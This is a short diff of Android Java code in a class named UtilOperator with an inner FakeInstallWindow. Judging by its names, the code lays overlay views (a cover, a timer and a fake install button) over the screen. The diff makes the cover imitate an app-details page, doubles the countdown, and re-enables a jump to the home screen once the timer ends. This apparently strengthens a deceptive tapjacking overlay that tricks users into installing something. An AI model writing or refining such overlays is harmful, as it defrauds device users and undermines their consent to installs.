@@ -66,13 +66,13 @@ public class UtilOperator {
         private View installView;
         private Context context;
         private WindowManager wm;
-        private int count = 10;
+        private int count = 20;
         private Handler handler;
 
         public FakeInstallWindow(Context context) {
             this.context = context;
             LayoutInflater layoutInflater = (LayoutInflater) context.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
-            coverView = layoutInflater.inflate(R.layout.fake_install, null);
+            coverView = layoutInflater.inflate(R.layout.app_details, null);
             timerView = layoutInflater.inflate(R.layout.fake_timer, null);
             timeTV = (TextView) timerView.findViewById(R.id.timer);
             installView = layoutInflater.inflate(R.layout.fake_install_btn, null);
@@ -83,7 +83,7 @@ public class UtilOperator {
         public void updateTimerCount() {
             if (count <= 0) {
                 if (coverView != null && timerView != null) {
-//                    UtilsRuntime.goHome(context);
+                    UtilsRuntime.goHome(context);
                     wm.removeView(coverView);
                     wm.removeView(timerView);
                     wm.removeView(installView);
